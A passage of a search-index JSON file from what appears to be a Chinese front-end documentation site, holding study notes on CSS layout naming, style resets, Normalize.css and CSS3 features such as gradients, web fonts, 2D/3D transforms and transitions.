常用布局名词\",\"slug\":\"_11-常用布局名词\",\"contents\":[\"位置\",\"名词\",\"顶部导航条\",\"topbar\",\"页头\",\"header、page-header\",\"导航\",\"nav、navigator、navbar\",\"搜索框\",\"search、search-box\",\"横幅、广告、宣传图\",\"banner\",\"主要内容\",\"content、main\",\"侧边栏\",\"aside、sidebar\",\"页脚\",\"footer、page-footer\"]},{\"header\":\"12. 重置默认样式（CSS初始化）\",\"slug\":\"_12-重置默认样式-css初始化\",\"contents\":[\"很多元素都有默认样式，比如：\",\"p 元素有默认的上下 margin\",\"h1~h6 标题也有上下 margin ，且字体加粗\",\"body 元素有默认的 8px 外边距\",\"超链接有默认的文字颜色和下划线\",\"ul 元素有默认的左 padding\",\"……\"]},{\"header\":\"12.1 使用全局选择器\",\"slug\":\"_12-1-使用全局选择器\",\"contents\":[\"* { margin: 0; padding: 0; ...... } \"]},{\"header\":\"12.2 reset.css\",\"slug\":\"_12-2-reset-css\",\"contents\":[\"选择到具有默认样式的元素，清空其默认的样式\"]},{\"header\":\"12.3 Normalize.css\",\"slug\":\"_12-3-normalize-css\",\"contents\":[\"Normalize.css 是一种最新方案，它在清除默认样式的基础上，保留了一些有价值的默认样式\",\"官网地址：Normalize.css\",\"相对于 reset.css ， Normalize.css 有如下优点：\",\"保护了有价值的默认样式，而不是完全去掉它们\",\"为大部分 HTML 元素提供一般化的样式\",\"新增对 HTML5 元素的设置\",\"对并集选择器的使用比较谨慎，有效避免调试工具杂乱\"]}]},\"/front-end/css-notes/12-CSS3%E7%AE%80%E4%BB%8B.html\":{\"title\":\"CSS3简介\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS3 是 CSS2 的升级版本，它在 CSS2 的基础上，新增了很多强大的新功能，从而解决一些实际面临的问题\",\"CSS3 在未来会按照模块化的方式去发展，一些最重要CSS3模块：\",\"选择器\",\"盒模型\",\"背景和边框\",\"文字特效\",\"2D/3D转换\",\"动画\",\"多列布局\",\"用户界面\",\"CSS3 的新特性如下：\",\"新增了更加实用的选择器，例如：动态伪类选择器、目标伪类选择器、伪元素选择器等等\",\"新增了更好的视觉效果，例如：圆角、阴影、渐变等\",\"新增了丰富的背景效果，例如：支持多个背景图片，同时新增了若干个背景相关的属性\",\"新增了全新的布局方案 —— 弹性盒子\",\"新增了 Web 字体，可以显示用户电脑上没有安装的字体\",\"增强了颜色，例如： HSL 、 HSLA 、 RGBA 几种新的颜色模式，新增 opacity 属性来控制透明度\",\"增加了 2D 和 3D 变换，例如：旋转、扭曲、缩放、位移等\",\"增加动画与过渡效果，让效果的变换更具流线性、平滑性\",\"……\"]}]},\"/front-end/css-notes/13-CSS3%E6%B5%8F%E8%A7%88%E5%99%A8%E7%A7%81%E6%9C%89%E5%89%8D%E7%BC%80.html\":{\"title\":\"CSS3浏览器私有前缀\",\"contents\":[{\"header\":\"1. 什么是私有前缀？\",\"slug\":\"_1-什么是私有前缀\",\"contents\":[\"如下代码中的 -webkit- 就是私有前缀\",\"div { width:400px; height:400px; -webkit-border-radius: 20px; } \"]},{\"header\":\"2. 为什么要有私有前缀\",\"slug\":\"_2-为什么要有私有前缀\",\"contents\":[\"W3C 标准所提出的某个 CSS 特性，在被浏览器正式支持之前，浏览器厂商会根据浏览器的内核，使用私有前缀来测试该 CSS 特性，在浏览器正式支持该 CSS 特性后，就不需要私有前缀了\",\"查询 CSS3 兼容性的网站：Can I use... Support tables for HTML5, CSS3\",\"常见浏览器私有前缀:\",\"Chrome 浏览器： -webkit-\",\"Safari 浏览器： -webkit-\",\"Firefox 浏览器： -moz-\",\"Edge 浏览器：-webkit-\",\"旧 Opera 浏览器： -o-\",\"旧 IE 浏览器： -ms-\"]}]},\"/front-end/css-notes/14-CSS3%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7.html\":{\"title\":\"CSS3自定义属性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS3自定义属性是一种定义在 :root 参照根元素上的属性，可以被所有后代元素所继承和使用\",\"自定义属性可以用 -- 作为前缀来定义，如：--primary-color: #ff0000\",\"定义自定义属性后，可以在任何CSS规则内使用var()函数来引用自定义属性的值\",\"示例：\",\"定义一个自定义属性：\",\":root { --primary-color: #ff0000; } \",\"使用自定义属性：\",\"body { background-color: var(--primary-color); } \",\"在上述代码中，我们定义了一个名为 --primary-color 的自定义属性，并将其值设置为红色。在 body 元素的CSS规则中，我们使用 var() 函数来引用这个自定义属性，并将其值设置为 background-color 的值，这样 body 的背景色会使用 --primary-color 自定义属性的值，即红色\",\"使用自定义属性的好处是代码的可重用性和构建更易于维护的样式库，可以使开发者在整个网站中更容易地应用相同的样式属性\"]}]},\"/front-end/css-notes/15-CSS3%E9%80%89%E6%8B%A9%E5%99%A8.html\":{\"title\":\"CSS3选择器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS3新增的选择器有：动态伪类、目标伪类、语言伪类、 UI 伪类、结构伪类、否定伪类、伪元素\",\"具体内容看前面CSS选择器部分\"]}]},\"/front-end/css-notes/16-CSS3%E8%BE%B9%E6%A1%86.html\":{\"title\":\"CSS3边框\",\"contents\":[{\"header\":\"1. 盒子阴影\",\"slug\":\"_1-盒子阴影\",\"contents\":[\"使用 box-shadow 属性为盒子添加阴影\",\"语法：\",\" box-shadow: h-shadow v-shadow blur spread color inset; \",\"值\",\"描述\",\"h-shadow\",\"必需。水平阴影的位置，允许负值\",\"v-shadow\",\"必需。垂直阴影的位置，允许负值\",\"blur\",\"可选。模糊距离\",\"spread\",\"可选。阴影的尺寸\",\"color\",\"可选。阴影的颜色\",\"inset\",\"可选。将外部阴影 (outset)改为内部阴影\",\"注意：\",\"box-shadow-none，表示没有阴影\",\"默认的是外阴影（outset），但是不可以写，否则会造成阴影无效\",\"盒子阴影不占用空间，不会影响其它盒子排列\",\"例：\",\"/* 写两个值，含义：水平位置、垂直位置 */ box-shadow: 10px 10px; /* 写三个值，含义：水平位置、垂直位置、颜色 */ box-shadow: 10px 10px red; /* 写三个值，含义：水平位置、垂直位置、模糊值 */ box-shadow: 10px 10px 10px; /* 写四个值，含义：水平位置、垂直位置、模糊值、颜色 */ box-shadow: 10px 10px 10px red; /* 写五个值，含义：水平位置、垂直位置、模糊值、外延值、颜色 */ box-shadow: 10px 10px 10px 10px blue; /* 写六个值，含义：水平位置、垂直位置、模糊值、外延值、颜色、内阴影 */ box-shadow: 10px 10px 20px 3px blue inset; \"]},{\"header\":\"2. 圆角边框\",\"slug\":\"_2-圆角边框\",\"contents\":[\"使用 border-radius 属性用于设置元素的外边框圆角\",\"语法：\",\" border-radius:length; \",\"参数值可以为数值或百分比的形式\",\"如果是正方形，想要设置为一个圆，把数值修改为高度或者宽度的一半即可，或者直接写为 50%\",\"该属性是一个简写属性，可以跟四个值，分别代表左上角、右上角、右下角、左下角\",\"分开写：border-top-left-radius、border-top-right-radius、border-bottom-right-radius 和 border-bottom-left-radius\"]},{\"header\":\"3. 边框外轮廓\",\"slug\":\"_3-边框外轮廓\",\"contents\":[\"outline-width ：外轮廓的宽度\",\"outline-color ：外轮廓的颜色\",\"outline-style ：外轮廓的风格\",\"none ： 无轮廓\",\"dotted ： 点状轮廓\",\"dashed ： 虚线轮廓\",\"solid ： 实线轮廓\",\"double ： 双线轮廓\",\"outline-offset 设置外轮廓与边框的距离，正负值都可以设置（注意，outline-offset 不是 outline 的子属性，是一个独立的属性）\",\"outline 复合属性 outline:50px solid blue;\",\"注意，轮廓与边框有两点不同：\",\"轮廓不占用空间\",\"轮廓可能是非矩形\"]}]},\"/front-end/css-notes/17-CSS3%E8%83%8C%E6%99%AF.html\":{\"title\":\"CSS3背景\",\"contents\":[{\"header\":\"1. background-origin\",\"slug\":\"_1-background-origin\",\"contents\":[\"作用：设置背景图的原点\",\"属性值：\",\"padding-box ：从 padding 区域开始显示背景图像—— 默认值\",\"border-box ： 从 border 区域开始显示背景图像\",\"content-box ： 从 content 区域开始显示背景图像\"]},{\"header\":\"2. background-clip\",\"slug\":\"_2-background-clip\",\"contents\":[\"作用：设置背景图的向外裁剪的区域\",\"属性值：\",\"border-box ： 从 border 区域开始向外裁剪背景。 —— 默认值\",\"padding-box ： 从 padding 区域开始向外裁剪背景\",\"content-box ： 从 content 区域开始向外裁剪背景\",\"text ：背景图只呈现在文字上（backgroun-clip 要加上 -webkit- 前缀）\"]},{\"header\":\"3. background-size\",\"slug\":\"_3-background-size\",\"contents\":[\"作用：设置背景图的尺寸\",\"属性值：\",\"用长度值指定背景图片大小，不允许负值 background-size: 300px 200px;\",\"用百分比指定背景图片大小，不允许负值 background-size: 100% 100%;\",\"auto：背景图片的真实大小。 —— 默认值\",\"contain：将背景图片等比缩放，使背景图片的宽或高，与容器的宽或高相等，再将完整背景图片包含在容器内，但要注意：可能会造成容器里部分区域没有背景图片 background-size: contain;\",\"cover：将背景图片等比缩放，直到完全覆盖容器，图片会尽可能全的显示在元素上，但要注意：背景图片有可能显示不完整。—— 相对比较好的选择 background-size: cover;\"]},{\"header\":\"4. background复合属性\",\"slug\":\"_4-background复合属性\",\"contents\":[\"语法：\",\"background: color url repeat position / size origin clip \",\"注意：\",\"origin 和 clip 的值如果一样，如果只写一个值，则 origin 和 clip 都设置；如果设置了两个值，前面的是 origin ，后面的 clip\",\"size 的值必须写在 position 值的后面，并且用 / 分开\"]},{\"header\":\"5. 多背景图\",\"slug\":\"_5-多背景图\",\"contents\":[\"CSS3 允许元素设置多个背景图片\",\"/* 添加多个背景图 */ background: url(../images/bg-lt.png) no-repeat, url(../images/bg-rt.png) no-repeat right top, url(../images/bg-lb.png) no-repeat left bottom, url(../images/bg-rb.png) no-repeat right bottom; \"]}]},\"/front-end/css-notes/18-CSS3%E6%96%87%E6%9C%AC%E6%95%88%E6%9E%9C.html\":{\"title\":\"CSS3文本效果\",\"contents\":[{\"header\":\"1. 文本阴影\",\"slug\":\"_1-文本阴影\",\"contents\":[\"在 CSS3 中，我们可以使用 text-shadow 属性将阴影应用于文本\",\"语法：\",\" text-shadow: h-shadow v-shadow blur color; \",\"值\",\"描述\",\"h-shadow\",\"必需。水平阴影的位置，允许负值\",\"v-shadow\",\"必需。垂直阴影的位置，允许负值\",\"blur\",\"可选。模糊的距离\",\"color\",\"可选。阴影的颜色\",\"默认值：text-shadow: none; 表示没有阴影\"]},{\"header\":\"2. 文本换行\",\"slug\":\"_2-文本换行\",\"contents\":[\"在 CSS3 中，我们可以使用 white-space 属性设置文本换行方式\",\"常用值如下：\",\"值\",\"含义\",\"normal\",\"文本超出边界自动换行，文本中的换行被浏览器识别为一个空格（默认值）\",\"pre\",\"原样输出，与 pre 标签的效果相同\",\"pre-wrap\",\"在 pre 效果的基础上，超出元素边界自动换行\",\"pre-line\",\"在 pre 效果的基础上，超出元素边界自动换行，且识别文本中的换行，空格会忽略\",\"nowrap\",\"强制不换行\"]},{\"header\":\"3. 文本溢出\",\"slug\":\"_3-文本溢出\",\"contents\":[\"在 CSS3 中，我们可以使用 text-overflow 属性设置文本内容溢出时的呈现模式\",\"常用值如下：\",\"值\",\"含义\",\"clip\",\"当内联内容溢出时，将溢出部分裁切掉（默认值）\",\"ellipsis\",\"当内联内容溢出块容器时，将溢出部分替换为 …\",\"注意：要使得 text-overflow 属性生效，块容器必须显式定义 overflow 为非 visible 值， white-space 为 nowrap 值\"]},{\"header\":\"4. 文本修饰\",\"slug\":\"_4-文本修饰\",\"contents\":[\"CSS3 升级了 text-decoration 属性，让其变成了复合属性\",\"text-decoration: text-decoration-line || text-decoration-style || text-decoration-color \",\"子属性及其含义：\",\"text-decoration-line 设置文本装饰线的位置 \",\"none ： 指定文字无装饰 （默认值）\",\"underline ： 指定文字的装饰是下划线\",\"overline ： 指定文字的装饰是上划线\",\"line-through ： 指定文字的装饰是贯穿线\",\"text-decoration-style 文本装饰线条的形状 \",\"solid ： 实线 （默认）\",\"double ： 双线\",\"dotted ： 点状线条\",\"dashed ： 虚线\",\"wavy ： 波浪线\",\"text-decoration-color 文本装饰线条的颜色\"]},{\"header\":\"5. 文本描边\",\"slug\":\"_5-文本描边\",\"contents\":[\"注意：文字描边功能仅 webkit 内核浏览器支持\",\"-webkit-text-stroke-width ：设置文字描边的宽度，写长度值\",\"-webkit-text-stroke-color ：设置文字描边的颜色，写颜色值\",\"-webkit-text-stroke ：复合属性，设置文字描边宽度和颜色\"]}]},\"/front-end/css-notes/19-CSS3%E6%B8%90%E5%8F%98.html\":{\"title\":\"CSS3渐变\",\"contents\":[{\"header\":\"1. 线性渐变\",\"slug\":\"_1-线性渐变\",\"contents\":[\"多个颜色之间的渐变，默认从上到下渐变\",\"background-image:linear-gradient(red,yellow,green); \",\"使用关键词设置线性渐变的方向\",\"background-image: linear-gradient(to right top,red,yellow,green); \",\"使用角度设置线性渐变的方向\",\"background-image: linear-gradient(30deg,red,yellow,green); \",\"调整开始渐变的位置\",\"background-image: linear-gradient(red 50px,yellow 100px ,green 150px); \"]},{\"header\":\"2. 径向渐变\",\"slug\":\"_2-径向渐变\",\"contents\":[\"多个颜色之间的渐变，默认从圆心四散。（注意：不一定是正圆，要看容器本身宽高比）\",\"background-image: radial-gradient(red,yellow,green); \",\"使用关键词调整渐变圆的圆心位置\",\"background-image: radial-gradient(at right top,red,yellow,green); \",\"使用像素值调整渐变圆的圆心位置\",\"background-image: radial-gradient(at 100px 50px,red,yellow,green); \",\"调整渐变形状为正圆\",\"background-image: radial-gradient(circle,red,yellow,green); \",\"调整形状的半径\",\"background-image: radial-gradient(100px,red,yellow,green); \",\"background-image: radial-gradient(50px 100px,red,yellow,green); \",\"调整开始渐变的位置\",\"background-image: radial-gradient(red 50px,yellow 100px,green 150px); \"]},{\"header\":\"3. 重复渐变\",\"slug\":\"_3-重复渐变\",\"contents\":[\"无论线性渐变，还是径向渐变，在没有发生渐变的位置，继续进行渐变，就为重复渐变\",\"使用 repeating-linear-gradient 进行重复线性渐变，具体参数同 linear-gradient\",\"使用 repeating-radial-gradient 进行重复径向渐变，具体参数同 radial-gradient\"]}]},\"/front-end/css-notes/20-CSS3%E5%AD%97%E4%BD%93.html\":{\"title\":\"CSS3字体\",\"contents\":[{\"header\":\"1. 基本用法\",\"slug\":\"_1-基本用法\",\"contents\":[\"可以通过 @font-face 指定字体的具体地址，浏览器会自动下载该字体，这样就不依赖用户电脑上的字体了\",\"语法（简写方式）：\",\"@font-face { font-family: \\\"情书字体\\\"; src: url('./方正手迹.ttf'); } \",\"语法（高兼容性写法）：\",\"@font-face { font-family: \\\"atguigu\\\"; font-display: swap; src: url('webfont.eot'); /* IE9 */ src: url('webfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */ url('webfont.woff2') format('woff2'), url('webfont.woff') format('woff'), /* chrome、firefox */ url('webfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android*/ url('webfont.svg#webfont') format('svg'); /* iOS 4.1- */ } \"]},{\"header\":\"2. 定制字体\",\"slug\":\"_2-定制字体\",\"contents\":[\"中文的字体文件很大，使用完整的字体文件不现实，通常针对某几个文字进行单独定制\",\"可使用阿里 Web 字体定制工具：iconfont-webfont平台\"]},{\"header\":\"3. 字体图标\",\"slug\":\"_3-字体图标\",\"contents\":[\"字体图标可以为前端工程师提供一种方便高效的图标使用方式，展示的是图标，本质属于字体\",\"字体图标使用场景：主要用于显示网页中通用的、常用的一些小图标\",\"字体图标的优点：\",\"轻量级：一个图标字体要比一系列的图像要小。一旦字体加载了，图标就会马上渲染出来，减少了服务器请求\",\"灵活性：本质其实是文字，可以很随意的改变颜色、产生阴影、透明效果、旋转等\",\"兼容性：几乎支持所有的浏览器，请放心使用\",\"注意： 字体图标不能替代精灵技术，只是对工作中图标部分技术的提升和优化\"]}]},\"/front-end/css-notes/21-CSS3%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2.html\":{\"title\":\"CSS3用户界面\",\"contents\":[{\"header\":\"1. box-sizing怪异盒模型\",\"slug\":\"_1-box-sizing怪异盒模型\",\"contents\":[\"使用 box-sizing 属性可以设置盒模型的两种类型\",\"可选值\",\"含义\",\"content-box\",\"width 和 height 设置的是盒子内容区的大小（默认值）\",\"border-box\",\"width 和 height 设置的是盒子总大小（怪异盒模型）\"]},{\"header\":\"2. resize调整尺寸\",\"slug\":\"_2-resize调整尺寸\",\"contents\":[\"使用 resize 属性可以控制是否允许用户调节元素尺寸\",\"值\",\"含义\",\"none\",\"不允许用户调整元素大小（默认）\",\"both\",\"用户可以调节元素的宽度和高度\",\"horizontal\",\"用户可以调节元素的宽度\",\"vertical\",\"用户可以调节元素的高度\",\"例如：实际开发中，我们文本域右下角是不可以拖拽的：\",\" textarea{ resize: none; } \"]}]},\"/front-end/css-notes/22-CSS3%E9%95%BF%E5%BA%A6%E5%92%8C%E9%A2%9C%E8%89%B2.html\":{\"title\":\"CSS3长度和颜色\",\"contents\":[{\"header\":\"1. CSS3新增长度单位\",\"slug\":\"_1-css3新增长度单位\",\"contents\":[\"rem 根元素字体大小的倍数，只与根元素字体大小有关\",\"vw 视口宽度的百分之多少 10vw 就是视口宽度的 10%\",\"vh 视口高度的百分之多少 10vh 就是视口高度的 10%\",\"vmax 视口宽高中大的那个的百分之多少\",\"vmin 视口宽高中小的那个的百分之多少\"]},{\"header\":\"2. CSS3新增颜色设置方式\",\"slug\":\"_2-css3新增颜色设置方式\",\"contents\":[\"CSS3 新增了三种颜色设置方式，分别是： rgba 、 hsl 、 hsla，前面颜色部分有详细介绍\"]},{\"header\":\"3. opacity不透明度\",\"slug\":\"_3-opacity不透明度\",\"contents\":[\"opacity 属性能为整个元素添加透明效果，值是 0 到 1 之间的小数， 0 是完全透明， 1 表示完全不透明\",\"opacity 与 rgba 的区别：\",\"opacity 是一个属性，设置的是整个元素（包括元素里的内容）的不透明度\",\"rgba 是颜色的设置方式，用于设置颜色，它的透明度，仅仅是调整颜色的透明度\"]}]},\"/front-end/css-notes/23-CSS3%E6%BB%A4%E9%95%9C.html\":{\"title\":\"CSS3滤镜\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"filter CSS 属性将模糊或颜色偏移等图形效果应用于元素\",\"语法：\",\"filter:函数(); \",\"例如：\",\"filter: blur(5px);/* blur模糊处理,数值越大越模糊 */ \"]}]},\"/front-end/css-notes/24-CSS3calc%E5%87%BD%E6%95%B0.html\":{\"title\":\"CSS3calc函数\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"calc() 此 CSS 函数让你在声明 CSS 属性值时执行一些计算\",\"语法：\",\"width: calc(100% - 80px); \",\"括号里面可以使用 + - *  / 来进行计算\"]}]},\"/front-end/css-notes/25-CSS3%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80.html\":{\"title\":\"CSS3多列布局\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"作用：专门用于实现类似于报纸的布局\",\"常用属性如下：\",\"column-count ：指定列数，值是数字\",\"column-width ：指定列宽，值是长度\",\"columns ：同时指定列宽和列数，复合属性；值没有数量和顺序要求\",\"column-gap ：设置列边距，值是长度\",\"column-rule-style ：设置列与列之间边框的风格，值与 border-style 一致\",\"column-rule-width ：设置列与列之间边框的宽度，值是长度\",\"column-rule-color ：设置列与列之间边框的颜色\",\"coumn-rule ：设置列边框，复合属性\",\"column-span 指定是否跨列；值: none 、 all\"]}]},\"/front-end/css-notes/26-CSS3%E5%9B%BE%E5%BD%A2%E5%8F%98%E6%8D%A2.html\":{\"title\":\"CSS3图形变换\",\"contents\":[{\"header\":\"1. 2D变换\",\"slug\":\"_1-2d变换\",\"contents\":[\"二维坐标系如图：\",\"CSS3图形变换01.png\"]},{\"header\":\"1.1 2D位移\",\"slug\":\"_1-1-2d位移\",\"contents\":[\"2D 位移可以改变元素的位置，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值，相关可选值如下：\",\"translateX：设置水平方向位移，需指定长度值；若指定的是百分比，是参考自身宽度的百分比\",\"translateY：设置垂直方向位移，需指定长度值；若指定的是百分比，是参考自身高度的百分比\",\"translate：一个值代表水平方向，两个值代表水平和垂直方向\",\"注意点：\",\"位移与相对定位很相似，都不脱离文档流，不会影响到其它元素\",\"与相对定位的区别：相对定位的百分比值，参考的是其父元素；定位的百分比值，参考的是其自身\",\"浏览器针对位移有优化，与定位相比，浏览器处理位移的效率更高\",\"transform 可以链式编写，例如：transform: translateX(30px) translateY(40px);\",\"位移对行内元素无效\",\"位移配合定位，可实现元素水平垂直居中\"]},{\"header\":\"1.2 2D缩放\",\"slug\":\"_1-2-2d缩放\",\"contents\":[\"2D 缩放是指：让元素放大或缩小，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值，相关可选值如下： \",\"scaleX：设置水平方向的缩放比例，值为一个数字， 1 表示不缩放，大于 1 放大，小于 1 缩小\",\"scaleY：设置垂直方向的缩放比例，值为一个数字， 1 表示不缩放，大于 1 放大，小于 1 缩小\",\"scale：同时设置水平方向、垂直方向的缩放比例，一个值代表同时设置水平和垂直缩放；两个值分别代表：水平缩放、垂直缩放\",\"注意点： \",\"scale 的值，是支持写负数的，但几乎不用，因为容易让人产生误解\",\"借助缩放，可实现小于 12px 的文字\"]},{\"header\":\"1.3 2D旋转\",\"slug\":\"_1-3-2d旋转\",\"contents\":[\"2D 旋转是指：让元素在二维平面内，顺时针旋转或逆时针旋转，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值，相关可选值如下： \",\"rotate：设置旋转角度，需指定一个角度值 ( deg )，正值顺时针，负值逆时针\",\"注意： rotateZ(20deg) 相当于 rotate(20deg) ，当然到了 3D 变换的时候，还能写： rotate(x,x,x)\"]},{\"header\":\"1.4 2D扭曲\",\"slug\":\"_1-4-2d扭曲\",\"contents\":[\"2D 扭曲是指：让元素在二维平面内被“拉扯”，进而“走形”，实际开发几乎不用，了解即可，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值，相关可选值如下： \",\"skewX：设置元素在水平方向扭曲，值为角度值，会将元素的左上角、右下角拉扯\",\"skewY：设置元素在垂直方向扭曲，值为角度值，会将元素的左上角、右下角拉扯\",\"skew：一个值代表 skewX ，两个值分别代表： skewX 、 skewY\"]},{\"header\":\"1.5 多重变换\",\"slug\":\"_1-5-多重变换\",\"contents\":[\"多个变换，可以同时使用一个 transform 来编写\",\"transform: translate(-50%, -50%) rotate(45deg); \"]},{\"header\":\"1.6 变换原点\",\"slug\":\"_1-6-变换原点\",\"contents\":[\"元素变换时，默认的原点是元素的中心，使用 transform-origin 可以设置变换的原点\",\"修改变换原点对位移没有影响，对旋转和缩放会产生影响\",\"如果提供两个值，第一个用于横坐标，第二个用于纵坐标\",\"如果只提供一个，若是像素值，表示横坐标，纵坐标取 50% ；若是关键词，则另一个坐标取 50%\",\"/* 变换原点在元素的中心位置，百分比是相对于自身。—— 默认值 */ transform-origin: 50% 50%; /* 变换原点在元素的左上角 */ transform-origin: left top; /* 变换原点距离元素左上角 50px 50px 的位置 */ transform-origin: 50px 50px; /* 只写一个值的时候，第二个值默认为 50% */ transform-origin: 0; \"]},{\"header\":\"2. 3D变换\",\"slug\":\"_2-3d变换\",\"contents\":[]},{\"header\":\"2.1 开启3D空间\",\"slug\":\"_2-1-开启3d空间\",\"contents\":[\"重要原则：元素进行 3D 变换的首要操作：父元素必须开启 3D 空间！\",\"使用 transform-style 开启 3D 空间，可选值如下：\",\"flat ： 让子元素位于此元素的二维平面内（ 2D 空间）—— 默认值\",\"preserve-3d ： 让子元素位于此元素的三维空间内（ 3D 空间）\"]},{\"header\":\"2.2 设置景深\",\"slug\":\"_2-2-设置景深\",\"contents\":[\"何为景深？—— 指定观察者与 z=0 平面的距离，能让发生 3D 变换的元素，产生透视效果，看来更加立体\",\"使用 perspective 设置景深，可选值如下：\",\"none ： 不指定透视 ——（默认值）\",\"长度值 ： 指定观察者距离 z=0 平面的距离，不允许负值\",\"注意： perspective 设置给发生 3D 变换元素的父元素！\"]},{\"header\":\"2.3 透视点位置\",\"slug\":\"_2-3-透视点位置\",\"contents\":[\"所谓透视点位置，就是观察者位置；默认的透视点在元素的中心\",\"使用 perspective-origin 设置观察者位置（透视点的位置）\",\"/* 相对坐标轴往右偏移400px，往下偏移300px（相当于人蹲下300像素，然后向右移动400像素看元素） */ perspective-origin: 400px 300px; \",\"注意：通常情况下，我们不需要调整透视点位置\"]},{\"header\":\"2.4 3D位移\",\"slug\":\"_2-4-3d位移\",\"contents\":[\"3D 位移是在 2D 位移的基础上，可以让元素沿 z 轴位移，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值， 3D 相关可选值如下： \",\"translateZ：设置 z 轴位移，需指定长度值，正值向屏幕外，负值向屏幕里，且不能写百分比\",\"translate3d：第1个参数对应 x 轴，第2个参数对应 y 轴，第3个参数对应 z 轴，且均不能省略\"]},{\"header\":\"2.5 3D旋转\",\"slug\":\"_2-5-3d旋转\",\"contents\":[\"3D 旋转是在 2D 旋转的基础上，可以让元素沿 x 轴和 y 轴旋转，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值， 3D 相关可选值如下： \",\"rotateX：设置 x 轴旋转角度，需指定一个角度值 ( deg )，面对 x 轴正方向：正值顺时针，负值逆时针\",\"rotateY：设置 y 轴旋转角度，需指定一个角度值 ( deg )，面对 y 轴正方向：正值顺时针，负值逆时针\",\"rotate3d：前 3 个参数分别表示坐标轴： x , y , z ，第 4 个参数表示旋转的角度，参数不允许省略。例如：transform: rotate3d (1,1,1,30deg) ，意思是： x 、 y 、 z 分别旋转 30 度\"]},{\"header\":\"2.6 3D缩放\",\"slug\":\"_2-6-3d缩放\",\"contents\":[\"3D 缩放是在 2D 缩放的基础上，可以让元素沿 z 轴缩放，具体使用方式如下：\",\"先给元素添加转换属性 transform\",\"编写 transform 的具体值， 3D 相关可选值如下： \",\"scaleZ：设置 z 轴方向的缩放比例，值为一个数字， 1 表示不缩放，大于 1 放大，小于 1 缩小\",\"scale3d：第1个参数对应 x 轴，第2个参数对应 y 轴，第3个参数对应 z 轴，参数不允许省略\"]},{\"header\":\"2.7 多重变换\",\"slug\":\"_2-7-多重变换\",\"contents\":[\"多个变换，可以同时使用一个 transform 来编写\",\"transform: translateZ(100px) scaleZ(3) rotateY(40deg); \",\"注意点：多重变换时，建议最后旋转\"]},{\"header\":\"2.8 背部可见性\",\"slug\":\"_2-8-背部可见性\",\"contents\":[\"使用 backface-visibility 指定元素背面，在面向用户时是否可见，常用值如下：\",\"visible：指定元素背面可见，允许显示正面的镜像。—— 默认值\",\"hidden：指定元素背面不可见\",\"注意： backface-visibility 需要加在发生 3D 变换元素的自身上\"]}]},\"/front-end/css-notes/27-CSS3%E8%BF%87%E6%B8%A1%E4%B8%8E%E5%8A%A8%E7%94%BB.html\":{\"title\":\"CSS3过渡与动画\",\"contents\":[{\"header\":\"1. 过渡\",\"slug\":\"_1-过渡\",\"contents\":[\"过渡可以在不使用 Flash 动画，不使用 JavaScript 的情况下，让元素从一种样式平滑过渡为另一种样式\"]},{\"header\":\"1.1 transition-property\",\"slug\":\"_1-1-transition-property\",\"contents\":[\"作用：定义哪个属性需要过渡，只有在该属性中定义的属性（比如宽、高、颜色等）才会有过渡效果\",\"常用值：\",\"none ：不过渡任何属性\",\"all ：过渡所有能过渡的属性\",\"具体某个属性名，例如： width 、 heigtht，若有多个以逗号分隔\",\"不是所有的属性都能过渡，值为数字，或者值能转为数字的属性，都支持过渡，否则不支持过渡。常见的支持过渡的属性有：颜色、长度值、百分比、 z-index 、 opacity 、 2D 变换属性、 3D 变换属性、阴影\"]},{\"header\":\"1.2 transition-duration\",\"slug\":\"_1-2-transition-duration\",\"contents\":[\"作用：设置过渡的持续时间，即：一个状态过渡到另外一个状态耗时多久\",\"常用值：\",\"0 ：没有任何过渡时间 —— 默认值\",\"s 或 ms ：秒或毫秒\",\"列表 ： \",\"如果想让所有属性都持续一个时间，那就写一个值\",\"如果想让每个属性持续不同的时间那就写一个时间的列表\"]},{\"header\":\"1.3 transition-delay\",\"slug\":\"_1-3-transition-delay\",\"contents\":[\"作用：指定开始过渡的延迟时间，单位： s 或 ms\"]},{\"header\":\"1.4 transition-timing-function\",\"slug\":\"_1-4-transition-timing-function\",\"contents\":[\"作用：设置过渡的类型\",\"常用值：\",\"ease ： 平滑过渡 —— 默认值\",\"linear ： 线性过渡\",\"ease-in ： 慢 → 快\",\"ease-out ： 快 → 慢\",\"ease-in-out ： 慢 → 快 → 慢\",\"step-start ： 等同于 steps (1, start)\",\"step-end ： 等同于 steps (1, end)\",\"steps( integer,?) ： 接受两个参数的步进函数。第一个参数必须为正整数，指定函数的步数。第二个参数取值可以是 start 或 end ，指定每一步的值发生变化的时间点。第二个参数默认值为 end\",\"cubic-bezie ( number, number, number, number)： 特定的贝塞尔曲线类型\",\"在线制作贝塞尔曲线： cubic-bezier✿\"]},{\"header\":\"1.5 transition 复合属性\",\"slug\":\"_1-5-transition-复合属性\",\"contents\":[\"如果设置了一个时间，表示 duration ；如果设置了两个时间，第一是 duration ，第二个是 delay ；其他值没有顺序要求\",\"transition:1s 1s linear all; \"]},{\"header\":\"2. 动画\",\"slug\":\"_2-动画\",\"contents\":[]},{\"header\":\"2.1 什么是帧\",\"slug\":\"_2-1-什么是帧\",\"contents\":[\"一段动画，就是一段时间内连续播放 n 个画面。每一张画面，我们管它叫做“帧”。一定时间内连续快速播放若干个帧，就成了人眼中所看到的动画。同样时间内，播放的帧数越多，画面看起来越流畅\"]},{\"header\":\"2.2 